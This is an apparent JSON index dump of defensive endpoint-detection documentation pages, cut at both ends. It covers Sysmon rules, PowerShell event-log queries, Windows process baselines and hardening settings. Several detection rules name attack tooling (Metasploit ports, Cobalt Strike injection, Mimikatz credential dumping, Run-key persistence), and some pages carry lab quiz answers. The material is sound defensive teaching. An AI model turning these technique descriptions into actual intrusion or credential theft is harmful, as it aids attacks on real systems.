condition=\"image\">OneDrive.exe</Image> </NetworkConnect> </RuleGroup> Note: Attackers and adversaries have begun to use port 53 as part of their malware/payloads which would go undetected if you blindly used this configuration file as-is. RAT being dropped on server  Open C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\Hunting_Rats.evtx in Event Viewer to view a live rat being dropped onto the server. The event shows a custom RAT that operating on port 8080. Hunting for common back connect ports with PowerShell  Filter on the NetworkConnect event ID and the DestinationPort data attribute. Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name=\"DestinationPort\"] and */EventData/Data=<Port>' Resources  MITRE ATT&CK Software",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "a1fe222eec7feff7c535d6f09b127499",
    "u": "https://edr.tymyrddin.dev/docs/osquery/schemas",
    "t": "Schema documentation ",
    "c": "Schema documentation  Break down of the important information in the schema documentation: A dropdown lists various versions of Osquery. Choose the version of Osquery you wish to see schema tables for. The number of tables within the selected version of Osquery. (In the above image, 106 tables are available). The list of tables is listed in alphabetical order for the selected version of Osquery. This is the same result we get when we use the .table command in the interactive mode. The name of the table and a brief description. A detailed chart showing each table’s column, type, and description. Information to which Operating System the table applies. (In the above image, the account_policy_data table is available only for macOS) A dropdown menu to select the Operating System of choice. We can choose multiple Operating Systems, which will display the tables available for those Operating systems. Resources  Osquery 5.5.1 schema documentation",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "43030c1c228bcb0c6abe74bb944ad4e7",
    "u": "https://edr.tymyrddin.dev/docs/windows/logging",
    "t": "Persistence and logging ",
    "c": "Persistence and logging  WMI Subscription Monitoring  Detects malicious WMI event subscriptions (e.g., __EventFilter). Finds APT29 implants that use WMI for persistence. Script: Get - WmiObject - Namespace root \\ Subscription - Class __EventFilter Windows Event Forwarding (WEF)  Centralizes logs (Security, Sysmon, PowerShell Operational). Essential for threat hunting (e.g., detecting Invoke-Mimikatz). Deploy: wecutil qc / q",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "20561be3b2c68a35c1524cae73f77c89",
    "u": "https://edr.tymyrddin.dev/docs/windows/memory",
    "t": "Memory protection ",
    "c": "Memory protection  Credential Guard  Uses virtualization-based security (VBS) to isolate LSASS -> Prevents Mimikatz-style attacks (e.g., sekurlsa::logonpasswords). Enable: Enable - WindowsOptionalFeature - Online - FeatureName \"VirtualizationBasedSecurity\" - All Arbitrary Code Guard (ACG)  Blocks non-signed code execution in memory -> Stops PowerShell exploits and shellcode injection. Deploy: Set - ProcessMitigation - PolicyFilePath . \\ ACG_Config . xml",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "39efa2572f406b7491906c5a2eace1c9",
    "u": "https://edr.tymyrddin.dev/docs/sysmon/metasploit",
    "t": "Hunting metasploit ",
    "c": "Hunting metasploit  Metasploit is a commonly used exploit framework for penetration testing and red team operations. Metasploit can be used to easily run exploits on a machine and connect back to a meterpreter shell. To begin hunting for it, look for network connections that originate from suspicious ports such as 4444 and 5555. By default, Metasploit uses port 4444. If there is a connection to any IP known or unknown it should be investigated. To start an investigation, look at packet captures from the date of the log to begin looking for further information about the adversary. Also look for suspicious processes created. This method of hunting can be applied to other various RATs and C2 beacons. Network Connections config  Modify the Ion-Security configuration to detect the creation of new network connections. Use event ID 3 along with the destination port to identify active connections specifically connections on port 4444 and 5555 . <RuleGroup name=\"\" groupRelation=\"or\"> <NetworkConnect onmatch=\"include\"> <DestinationPort condition=\"is\">4444</DestinationPort> <DestinationPort condition=\"is\">5555</DestinationPort> </NetworkConnect> </RuleGroup> Metasploit payload dropped  Open C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\Hunting_Metasploit.evtx in Event Viewer to view a basic Metasploit payload being dropped onto the machine. Once we identify the event it can give us some important information we can use for further investigation like the ProcessID and Image . Hunting for Open Ports with PowerShell  Use the same XPath queries as used in the rule to filter out events from NetworkConnect with DestinationPort . Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name=\"DestinationPort\"] and */EventData/Data=4444' Resources  ion-storm / sysmon-config Malware Common Ports Spreadsheet",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "fed04063eab8562bd20eee90a22eea51",
    "u": "https://edr.tymyrddin.dev/docs/sysmon/persistence",
    "t": "Hunting persistence ",
    "c": "Hunting persistence  Persistence is used by attackers to maintain access to a machine once it is compromised. There is a multitude of ways for an attacker to gain persistence on a machine. We will be focusing on registry modification as well as startup scripts. We can hunt persistence with Sysmon by looking for File Creation events as well as Registry Modification events. Startup persistence config  Use the SwiftOnSecurity detections for a file being placed in the \\Startup\\ or \\Start Menu directories. <RuleGroup name=\"\" groupRelation=\"or\"> <FileCreate onmatch=\"include\"> <TargetFilename name=\"T1023\" condition=\"contains\">\\Start Menu</TargetFilename> <TargetFilename name=\"T1165\" condition=\"contains\">\\Startup\\</TargetFilename> </FileCreate> </RuleGroup> Malicious EXE into the Startup folder  Open C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\T1023.evtx in Event Viewer to view a live attack on the machine that involves persistence by adding a malicious EXE into the Startup folder. The event shows persist.exe placed in the Startup folder. Threat Actors will almost never make it this obvious but any changes to the Start Menu should be investigated. Adjust the configuration file to be more granular and create alerts past just the File Created tag. Another option is to filter by the Rule Name T1023. Once suspicious binary or application has been identified, begin an investigation on the directory. Registry Key Persistence config  Another SwiftOnSecurity detection, now for a registry modification that adjusts for a script inside CurrentVersion\\Windows\\Run and other registry locations. <RuleGroup name=\"\" groupRelation=\"or\"> <RegistryEvent onmatch=\"include\"> <TargetObject name=\"T1060,RunKey\" condition=\"contains\">CurrentVersion\\Run</TargetObject> <TargetObject name=\"T1484\" condition=\"contains\">Group Policy\\Scripts</TargetObject> <TargetObject name=\"T1060\" condition=\"contains\">CurrentVersion\\Windows\\Run</TargetObject> </RegistryEvent> </RuleGroup> Modified registry  Open C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\T1060.evtx in Event Viewer to view an attack where the registry was modified to gain persistence. The event shows the registry was modified and malicious.exe was added to HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Persistence , and that the exe can be found at %windir%\\System32\\malicious.exe . Filtering by the RuleName T1060 makes finding the anomaly easier. If we wanted to investigate this anomaly we would need to look at the registry as well as the file location itself. Resources  MITRE ATT&CK T1547 MITRE ATT&CK T1112",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "e9481aa8f4ffadc55e5e597b6e0befce",
    "u": "https://edr.tymyrddin.dev/docs/wlogs/events",
    "t": "Event logs ",
    "c": "Event logs  The Windows Event Logs are not text files that can be viewed using a text editor. The raw data can be translated into XML using the Windows API. The events in these log files are stored in a proprietary binary format with a .evt or .evtx extension. The log files with the .evtx file extension typically reside in C:\\Windows\\System32\\winevt\\Logs . Elements  System Logs: Records events associated with the Operating System segments. They may include information about hardware changes, device drivers, system changes, and other activities related to the device. Security Logs: Records events connected to logon and logoff activities on a device. The system’s audit policy specifies the events. The logs are an excellent source for analysts to investigate attempted or successful unauthorized activity. Application Logs: Records events related to applications installed on a system. The main pieces of information include application errors, events, and warnings. Directory Service Events: Active Directory changes and activities are recorded in these logs, mainly on domain controllers. File Replication Service Events: DNS Event Logs: DNS servers use these logs to record domain events and to map out Custom Logs: Events are logged by applications that require custom data storage. This allows applications to control the log size or attach other parameters, such as ACLs, for security purposes. There are three main ways of accessing these event logs within a Windows system: Event Viewer (GUI-based application) Wevtutil.exe (command-line tool) Get-WinEvent (PowerShell cmdlet) Using the GUI method  Right-click on Start and select Event Viewer. Select the proper log: Applications and Services Logs -> Microsoft -> Windows -> Powershell -> Operational What is the Event ID for the first event? Scroll all the way down: Answer: 40961 Filter on Event ID 4104. What was the 2nd command executed in the PowerShell session? Filter on Event ID 4104 and scroll all the way down. Answer: whoami What is the Task Category for Event ID 4104? Answer: Execute a Remote Command Analyse the Windows PowerShell log. What is the Task Category for Event ID 800? On the left-hand side, navigate to Applications and Service Logs -> Windows PowerShell (standalone log). Clicking on the log entry to see the events listed with Event ID 800. Answer: Pipeline Execution Details Using Wevtutil.exe  Per Microsoft, the wevtutil.exe tool “enables you to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, to run queries, and to export, archive, and clear logs.” How many log names are in the machine? PS C:\\Users\\Administrator> wevtutil.exe el | Measure-Object Answer: 1071 What event files would be read when using the query-events command? PS C:\\Users\\Administrator> wevtutil.exe qe /? Answer: event log,log file,structured query . What option would you use to provide a path to a log file? Answer: /lf:true What is the VALUE for /q ? Answer: XPATH query The questions below are based on this command: wevtutil qe Application /c:3 /rd:true /f:text What is the log name? PS C:\\Users\\Administrator> wevtutil qe Application /c:3 /rd:true /f:text Answer: Application What is the /rd option for? Answer: Event read direction What is the /c option for? Answer: Maximum number of events to read Using Get-WinEvent  What are the names of the logs related to OpenSSH? Get-WinEvent -ListLog * Answer: OpenSSH/Admin,OpenSSH/Operational Search for PowerShell . What is the name of the 3rd log provider? Get-WinEvent -ListProvider *PowerShell* Answer: Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager Use Microsoft-Windows-PowerShell as the log provider. How many event ids are displayed for this event provider? (Get-WinEvent -ListProvider Microsoft-Windows-PowerShell).Events | Format-Table Id, Description Answer: 192 How do you specify the number of events to display? Answer: -MaxEvents When using the FilterHashtable parameter and filtering by level, what is the value for Informational? Answer: 4 Resources  Get-WinEvent Measure-Object",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "e57fd8c5934e9352166d176ca6b5191f",
    "u": "https://edr.tymyrddin.dev/docs/wlogs/xpath",
    "t": "XPath queries ",
    "c": "XPath queries  The W3C created XPath, or XML Path Language in full, to provide a standard syntax and semantics for addressing parts of an XML document and manipulating strings, numbers, and booleans. The Windows Event Log supports a subset of XPath 1.0. Using Get-WinEvent and XPath , what is the query to find WLMS events with a System Time of 2020-12-15T01:09:08.940277500Z ? Answer: Get-WinEvent -LogName Application -FilterXPath '*/System/Provider[@Name=\"WLMS\"] and */System/TimeCreated[@Name=\"SystemTime\"]=\"2020-12-15T01:09:08.940277500Z\"' Using Get-WinEvent and XPath , what is the query to find a user named Sam with a Logon Event ID of 4720 ? Answer: Get-WinEvent -LogName Security -FilterXPath '*/EventData/Data[@Name=\"TargetUserName\"]=\"Sam\" and */System/EventID=4720' How many results are returned? Answer: 2 What is the Message? Answer: A user account was created Still working with Sam as the user, what time was Event ID 4724 recorded? MM/DD/YYYY H:MM:SS [AM/PM] Get-WinEvent -LogName Security -FilterXPath '*/EventData/Data[@Name=\"TargetUserName\"]=\"Sam\" and */System/EventID=4724' Answer: 12/17/2020 1:57:14 PM What is the Provider Name? Answer: Microsoft-Windows-Security-Auditing Resources  XML Path Language (XPath) Version 1.0",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "e0105002ebeb36ff16571331af03a3bd",
    "u": "https://edr.tymyrddin.dev/docs/sysmon/events",
    "t": "Event IDs ",
    "c": "Event IDs  Sysmon gathers detailed and high-quality logs as well as event tracing that assists in identifying anomalies in the environment. Sysmon is most commonly used in conjunction with security information and event management (SIEM) system or other log parsing solutions that aggregate, filter, and visualize events. When installed on an endpoint, Sysmon will start early in the Windows boot process. In an ideal scenario, the events would be forwarded to a SIEM for further analysis. Sysmon includes 29 different types of Event IDs, all of which can be used within the config to specify how the events should be handled and analysed. Event ID 1: Process Creation  This event will look for any processes that have been created. You can use this to look for known suspicious processes or processes with typos that would be considered an anomaly. This event will use the CommandLine and Image XML tags. <RuleGroup name=\"\" groupRelation=\"or\"> <ProcessCreate onmatch=\"exclude\"> <CommandLine condition=\"is\">C:\\Windows\\system32\\svchost.exe -k appmodel -p -s camsvc</CommandLine> </ProcessCreate> </RuleGroup> The above code snippet is specifying the Event ID to pull from as well as what condition to look for. In this case, it is excluding the svchost.exe process from the event logs. Event ID 3: Network Connection  The network connection event will look for events that occur remotely. This will include files and sources of suspicious binaries as well as opened ports. This event will use the Image and DestinationPort XML tags. <RuleGroup name=\"\" groupRelation=\"or\"> <NetworkConnect onmatch=\"include\"> <Image condition=\"image\">nmap.exe</Image> <DestinationPort name=\"Alert,Metasploit\" condition=\"is\">4444</DestinationPort> </NetworkConnect> </RuleGroup> The above code snippet includes two ways to identify suspicious network connection activity. The first way will identify files transmitted over open ports. In this case, we are specifically looking for nmap.exe which will then be reflected within the event logs. The second method identifies open ports and specifically port 4444 which is commonly used with Metasploit. If the condition is met an event will be created and ideally trigger an alert for the SOC to further investigate. Event ID 7: Image Loaded  This event will look for DLLs loaded by processes, which is useful when hunting for DLL Injection and DLL Hijacking attacks. It is recommended to exercise caution when using this Event ID as it causes a high system load. This event will use the Image, Signed, ImageLoaded, and Signature XML tags. <RuleGroup name=\"\" groupRelation=\"or\"> <ImageLoad onmatch=\"include\"> <ImageLoaded condition=\"contains\">\\Temp\\</ImageLoaded> </ImageLoad> </RuleGroup> The above code snippet will look for any DLLs that have been loaded within the \\Temp\\ directory. If a DLL is loaded within this directory it can be considered an anomaly and should be further investigateded. Event ID 8: CreateRemoteThread  The CreateRemoteThread Event ID will monitor for processes injecting code into other processes. The CreateRemoteThread function is used for legitimate tasks and applications. However, it could be used by malware to hide malicious activity. This event will use the SourceImage, TargetImage, StartAddress, and StartFunction XML tags. <RuleGroup name=\"\" groupRelation=\"or\"> <CreateRemoteThread onmatch=\"include\"> <StartAddress name=\"Alert,Cobalt Strike\" condition=\"end with\">0B80</StartAddress> <SourceImage condition=\"contains\">\\</SourceImage> </CreateRemoteThread> </RuleGroup> The above code snippet shows two ways of monitoring for CreateRemoteThread. The first method will look at the memory address for a specific ending condition which could be an indicator of a Cobalt Strike beacon. The second method will look for injected processes that do not have a parent process. This should be considered an anomaly and require further investigation. Event ID 11: File Created  This event ID is will log events when files are created or overwritten the endpoint. This could be used to identify file names and signatures of files that are written to disk. This event uses TargetFilename XML tags. <RuleGroup name=\"\" groupRelation=\"or\"> <FileCreate onmatch=\"include\"> <TargetFilename name=\"Alert,Ransomware\" condition=\"contains\">HELP_TO_SAVE_FILES</TargetFilename> </FileCreate> </RuleGroup> The above code snippet is an example of a ransomware event monitor. This is just one example of a variety of different ways you can utilize Event ID 11. Event ID 12/13/14: Registry Event  This event looks for changes or modifications to the registry. Malicious activity from the registry can include persistence and credential abuse. This event uses TargetObject XML tags. <RuleGroup name=\"\" groupRelation=\"or\"> <RegistryEvent onmatch=\"include\"> <TargetObject name=\"T1484\" condition=\"contains\">Windows\\System\\Scripts</TargetObject> </RegistryEvent> </RuleGroup> The above code snippet will look for registry objects that are in the “Windows\\System\\Scripts” directory as this is a common directory for adversaries to place scripts to establish persistence. Event ID 15: FileCreateStreamHash  This event will look for any files created in an alternate data stream. This is a common technique used by adversaries to hide malware. This event uses TargetFilename XML tags. <RuleGroup name=\"\" groupRelation=\"or\"> <FileCreateStreamHash onmatch=\"include\"> <TargetFilename condition=\"end with\">.hta</TargetFilename> </FileCreateStreamHash> </RuleGroup> The above code snippet will look for files with the .hta extension that have been placed within an alternate data stream. Event ID 22: DNS Event  This event will log all DNS queries and events for analysis. The most common way to deal with these events is to exclude all trusted domains that you know will be very common “noise” in your environment. Once you get rid of the noise you can then look for DNS anomalies. This event uses QueryName XML tags. <RuleGroup name=\"\" groupRelation=\"or\"> <DnsQuery onmatch=\"exclude\"> <QueryName condition=\"end with\">.microsoft.com</QueryName> </DnsQuery> </RuleGroup> The above code snippet will get exclude any DNS events with the .microsoft.com query. This will get rid of the noise that you see within the environment. Starting Sysmon  In PowerShell or Command Prompt as Administrator: C:\\Users\\THM-Analyst\\Desktop\\Tools\\Sysmon>Sysmon.exe -accepteula -i ..\\Configuration\\swift.xml The event log is located under Applications and Services Logs/Microsoft/Windows/Sysmon/Operational . Resources  Sysmon v14.12 sysmon-config | A Sysmon configuration file for everybody to fork ion-storm / sysmon-config",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "2a2333a04746cbfc8efbffb49dc93af8",
    "u": "https://edr.tymyrddin.dev/docs/sysinternals/process",
    "t": "Process utilities ",
    "c": "Process utilities  Autoruns  “This utility, which has the most comprehensive knowledge of auto-starting locations of any startup monitor, shows you what programs are configured to run during system bootup or login, and when you start various built-in Windows applications like Internet Explorer, Explorer and media players. These programs and drivers include ones in your startup folder, Run, RunOnce, and other Registry keys. Autoruns reports Explorer shell extensions, toolbars, browser helper objects, Winlogon notifications, auto-start services, and much more. Autoruns goes way beyond other autostart utilities.” (official definition) This is a good tool to search for any malicious entries created in the local machine to establish Persistence. Questions  Run Autoruns and inspect what are the new entries in the Image Hijacks tab compared to the screenshot earlier. Earlier Now What entry was updated? Answer: taskmgr.exe What is the updated value? Answer: c:\\tools\\sysint\\procexp.exe ProcDump  “ ProcDump is a command-line utility whose primary purpose is monitoring an application for CPU spikes and generating crash dumps during a spike that an administrator or developer can use to determine the cause of the spike.” (official definition) Process Explorer  “The Process Explorer display consists of two sub-windows. The top window always shows a list of the currently active processes, including the names of their owning accounts, whereas the information displayed in the bottom window depends on the mode that Process Explorer is in: if it is in handle mode you’ll see the handles that the process selected in the top window has opened; if Process Explorer is in DLL mode you’ll see the DLLs and memory-mapped files that the process has loaded.” (official definition) There is an option within ProcExp to Verify Signatures. Once enabled, it shows up as a column within the Process view. Other options to note include Run at Logon and Replace Task Manager. Process Monitor  “Process Monitor is an advanced monitoring tool for Windows that shows real-time file system, Registry and process/thread activity. It combines the features of two legacy Sysinternals utilities, Filemon and Regmon, and adds an extensive list of enhancements including rich and non-destructive filtering, comprehensive event properties such as session IDs and usernames, reliable process information, full thread stacks with integrated symbol support for each operation, simultaneous logging to a file, and much more. Its uniquely powerful features will make Process Monitor a core utility in your system troubleshooting and malware hunting toolkit.” (official definition) The Ultimate Guide to Procmon -> PsExec  “PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. PsExec’s most powerful uses include launching interactive command-prompts on remote systems and remote-enabling tools like IpConfig that otherwise do not have the ability to show information about remote systems.” (official definition) PsExec is another tool that is utilized by adversaries. This tool is associated with MITRE techniques T1570 (Lateral Tool Transfer) , T1021.002 (Remote Services: SMB/Windows Admin Shares) , and T1569.002 (System Services: Service Execution) in MITRE ID S0029 . Everything You Wanted to know  Psexec ->",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "22d280b4ac6fac804089893e09a8d243",
    "u": "https://edr.tymyrddin.dev/docs/core/smss",
    "t": "smss.exe ",
    "c": "smss.exe  smss.exe (Session Manager Subsystem alias Windows Session Manager), is responsible for creating new sessions. It is the first user-mode process started by the kernel. This process starts the kernel and user modes of the Windows subsystem. This subsystem includes win32k.sys (kernel mode), winsrv.dll (user mode), and csrss.exe (user mode). smss.exe starts csrss.exe (Windows subsystem) and wininit.exe in Session 0, an isolated Windows session for the operating system, and csrss.exe and winlogon.exe for Session 1, which is the user session. The first child instance creates child instances in new sessions, done by smss.exe copying itself into the new session and self-terminating. Any other subsystem listed in the Required value of HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\Subsystems is also launched. smss.exe is also responsible for creating environment variables and virtual memory paging files. Normal  Image Path: %SystemRoot%\\System32\\smss.exe Parent Process: System Number of Instances: One master instance and child instance per session. The child instance exits after creating the session. User Account: Local System Start Time: Within seconds of boot time for the master instance Unusual  A different parent process other than System (PID 4 ) The image path is different from C:\\Windows\\System32 More than one running process. (children self-terminate and exit after each new session) The running User is not the SYSTEM user Unexpected registry entries for Subsystem Resources  Architecture of Windows NT Session Manager Subsystem",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "3f94db55f2a9e2e90b15e5bc166d66a5",
    "u": "https://edr.tymyrddin.dev/docs/core/winlogon",
    "t": "winlogon.exe ",
    "c": "winlogon.exe  The Windows Logon, winlogon.exe , is responsible for handling the Secure Attention Sequence (SAS). It is the ALT+CTRL+DELETE key combination users press to enter their username & password. This process is also responsible for loading the user profile. It loads the user’s NTUSER.DAT into HKCU , and userinit.exe loads the user’s shell. And it is also responsible for locking the screen and running the user’s screensaver, among other functions. smss.exe launches this process along with a copy of csrss.exe within Session 1. Normal  Image Path: %SystemRoot%\\System32\\winlogon.exe Parent Process: Created by an instance of smss.exe that exits, so analysis tools usually do not provide the parent process name. Number of Instances: One or more User Account: Local System Start Time: Within seconds of boot time for the first instance (for Session 1). Additional instances occur as new sessions are created, typically through Remote Desktop or Fast User Switching logons. Unusual  An actual parent process. ( smss.exe calls this process and self-terminates) Image file path other than C:\\Windows\\System32 Subtle misspellings to hide rogue processes in plain sight Not running as SYSTEM Shell value in the registry other than explorer.exe Resources  Winlogon Userinit",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "d2c48d5fbecd01da1c30e3725b87ec05",
    "u": "https://edr.tymyrddin.dev/docs/core/services",
    "t": "services.exe ",
    "c": "services.exe  The next process is the Service Control Manager (SCM) or services.exe . Its primary responsibility is to handle system services: loading services, interacting with services and starting or ending services. It maintains a database that can be queried using a Windows built-in utility, sc.exe . Information regarding services is stored in the registry, HKLM\\System\\CurrentControlSet\\Services . This process also loads device drivers marked as auto-start into memory. When a user logs into a machine successfully, this process is responsible for setting the value of the Last Known Good control set (Last Known Good Configuration), HKLM\\System\\Select\\LastKnownGood , to that of the CurrentControlSet . This process is the parent to several other key processes: svchost.exe , spoolsv.exe , msmpeng.exe , and dllhost.exe , to name a few. Normal  Image Path: %SystemRoot%\\System32\\services.exe Parent Process: wininit.exe Number of Instances: One User Account: Local System Start Time: Within seconds of boot time Unusual  A parent process other than wininit.exe Image file path other than C:\\Windows\\System32 Subtle misspellings to hide rogue processes in plain sight Multiple running instances Not running as SYSTEM Resources  Service Control Manager",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "574d0dd2c17ef5da62bea4be21ee2dc4",
    "u": "https://edr.tymyrddin.dev/docs/linux/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Endpoint Detection and Response (EDR) for Linux monitors system activity in real time, detecting and responding to threats like malware, unauthorized access, and suspicious behaviour. It leverages kernel-level visibility (eBPF, auditd) and open-source tools (Falco, Osquery) to secure servers, cloud workloads, and containers. Why?  Threats are evolving: Attackers increasingly target Linux systems (cloud servers, IoT, DevOps pipelines). Limited native security: Unlike Windows/macOS, Linux lacks built-in EDR capabilities. Critical for compliance: Required for frameworks like CIS, NIST, and PCI-DSS. How?  Kernel-level monitoring Filesystem integrity Container security Threat Hunting with Open Source",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "f3621585f52d032626b8352ede83db92",
    "u": "https://edr.tymyrddin.dev/docs/windows/process",
    "t": "Process & behaviour monitoring ",
    "c": "Process & behaviour monitoring  Kernel Callbacks  Hooks into Windows kernel (via ETW or MiniFilter) to monitor: Process creation (PsSetCreateProcessNotifyRoutineEx) Thread injection (PsSetLoadImageNotifyRoutine) DLL loading (NtCreateThreadEx) Detects: Process hollowing (malware spawning svchost.exe then hollowing it) Reflective DLL injection (Cobalt Strike) Tools: Microsoft Defender for Endpoint (uses ETW) Custom drivers (e.g., Sysmon with SwiftOnSecurity configs) User-Mode hooking  Injects hooks into APIs like: CreateRemoteThread (blocks thread injection) WriteProcessMemory (stops code injection) Catches fileless attacks (PowerShell scripts, WMI persistence). Example: // Detecting thread injection if ( lpStartAddress == \"C:\\Windows\\System32 \\a msi.dll\" ) { BlockExecution (); }",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "c80a7b7fc2a58c9daffcc3a459de4049",
    "u": "https://edr.tymyrddin.dev/docs/windows/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  A security system for Windows that detects, investigates, and mitigates threats like ransomware, credential theft, and LOLBins (Living-Off-the-Land Binaries). It combines Microsoft Defender for Endpoint, Attack Surface Reduction (ASR) rules, and behavioral analytics to stop advanced attacks. Why?  #1 targeted OS: 90% of malware attacks focus on Windows. Native tools aren’t enough: Defender misses fileless attacks and LOLBins. Regulatory demands: Needed for HIPAA, GDPR, and FedRAMP compliance. How?  Process & behaviour monitoring Memory protection Attack Surface Reduction (ASR) Network threat detection Persistence and logging Response techniques",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "051f87f2ecbd1865a00f81212dea7787",
    "u": "https://edr.tymyrddin.dev/docs/sysinternals/security",
    "t": "Security utilities ",
    "c": "Security utilities  Sysmon  “System Monitor (Sysmon) is a Windows system service and device driver that, once installed on a system, remains resident across system reboots to monitor and log system activity to the Windows event log. It provides detailed information about process creations, network connections, and changes to file creation time. By collecting the events it generates using Windows Event Collection or SIEM agents and subsequently analyzing them, you can identify malicious or anomalous activity and understand how intruders and malware operate on your network.” (official definition)",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "ff212fa2663bede17b01f6be9531a87e",
    "u": "https://edr.tymyrddin.dev/docs/windows/asr",
    "t": "Attack Surface Reduction (ASR) ",
    "c": "Attack Surface Reduction (ASR)  ASR rules  Native Windows Defender rules to block: Office macro execution (D4F940AB-401B-4EFC-AADC-AD5F3C50688A) LOLBins abuse (5BEB7EFE-FD9A-4556-801D-275E5FFC04CC) Stops Emotet (macros) and Living-off-the-Land attacks. Enable: Set - MpPreference - AttackSurfaceReductionRules_Ids < RuleGUID > - AttackSurfaceReductionRules_Actions Enabled WDAC (Windows Defender Application Control)  Allowlists signed executables (CI/CD pipelines only) to block unsigned malware (e.g., ransomware droppers). Deploy: ConvertFrom - CIPolicy - XmlFilePath . \\ Policy . xml - BinaryFilePath . \\ Policy . bin",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "475ebbf0bddbba944a4b1e53521d0d12",
    "u": "https://edr.tymyrddin.dev/docs/sysmon/evasion",
    "t": "Detecting evasion techniques ",
    "c": "Detecting evasion techniques  There are a number of evasion techniques used by malware authors to evade both antivirus and detections. Some examples of evasion techniques are Alternate Data Streams, Injections, Masquerading, Packing/Compression, Recompiling, Obfuscation, and Anti-Reversing Techniques. Alternate Data Streams are used by malware to hide its files from normal inspection by saving the file in a different stream apart from $DATA . Sysmon comes with an event ID to detect newly created and accessed streams allowing us to quickly detect and hunt malware that uses ADS. Injection techniques come in different types: Thread Hijacking, PE Injection, DLL Injection, and more. Here, the focus is on DLL Injection and back-dooring DLLs. This is done by taking an already used DLL that is used by an application and overwriting or including the malicious code within the DLL. Alternate Data Streams config  The first technique we will be looking at is hiding files using alternate data streams using Event ID 15. Event ID 15 will hash and log any NTFS Streams that are included within the Sysmon configuration file. This will allow us to hunt for malware that evades detections using ADS. To aid in hunting ADS we will be using the SwiftOnSecurity Sysmon configuration file. The code snippet below will hunt for files in the Temp and Startup folder as well as .hta and .bat extension. <RuleGroup name=\"\" groupRelation=\"or\"> <FileCreateStreamHash onmatch=\"include\"> <TargetFilename condition=\"contains\">Downloads</TargetFilename> <TargetFilename condition=\"contains\">Temp\\7z</TargetFilename> <TargetFilename condition=\"ends with\">.hta</TargetFilename> <TargetFilename condition=\"ends with\">.bat</TargetFilename> </FileCreateStreamHash> </RuleGroup> Files hiding in ADS  Open C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\Hunting_ADS.evtx in Event Viewer to view hidden files using an alternate data stream. The event shows the location of the file name as well as the contents of the file. Listing Data Streams: C:\\\\Users\\\\THM-Threat>dir /r Remote Threads config  Adversaries also commonly use remote threads to evade detections in combination with other techniques. Remote threads are created using the Windows API CreateRemoteThread and can be accessed using OpenThread and ResumeThread . This is used in multiple evasion techniques including DLL Injection, Thread Hijacking, and Process Hollowing. Use the Sysmon event ID 8 from the SwiftOnSecurity configuration file. The code snippet excludes common remote threads without including any specific attributes. This allows for a more open and precise event rule. <RuleGroup name=\"\" groupRelation=\"or\"> <CreateRemoteThread onmatch=\"exclude\"> <SourceImage condition=\"is\">C:\\Windows\\system32\\svchost.exe</SourceImage> <TargetImage condition=\"is\">C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</TargetImage> </CreateRemoteThread> </RuleGroup> Process hollowing notepad.exe  Open C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\Detecting_RemoteThreads.evtx in Event Viewer to observe a Process Hollowing attack that abuses the notepad.exe process. The event shows powershell.exe creating a remote thread and accessing notepad.exe . Detecting evasion techniques with PowerShell  Detecting remote thread creation: Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=8' Resources  MITRE ATT&CK T1564 MITRE ATT&CK T1055",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "c64e4d8196fc7830aa9a4afc40ee0f92",
    "u": "https://edr.tymyrddin.dev/docs/macos/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  A security layer for macOS that detects and prevents malware, unauthorized executions, and data exfiltration. It uses Apple’s Endpoint Security Framework (ESF), System Integrity Protection (SIP), and XProtect to monitor processes, file changes, and network activity. Why?  Macs are high-value targets: Attacks rose 300%+ in 2023 (Malwarebytes). Apple’s defenses aren’t enough: SIP/XProtect miss fileless attacks, adware, and zero-days. Organisational risk: Macs in organisational networks need zero-trust controls. How?  Process monitoring Memory protection Behavioural detection Network hardening",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "11ede6a6b7d4f3c9fdbd372a7da60b50",
    "u": "https://edr.tymyrddin.dev/docs/core/lsass",
    "t": "lsass.exe ",
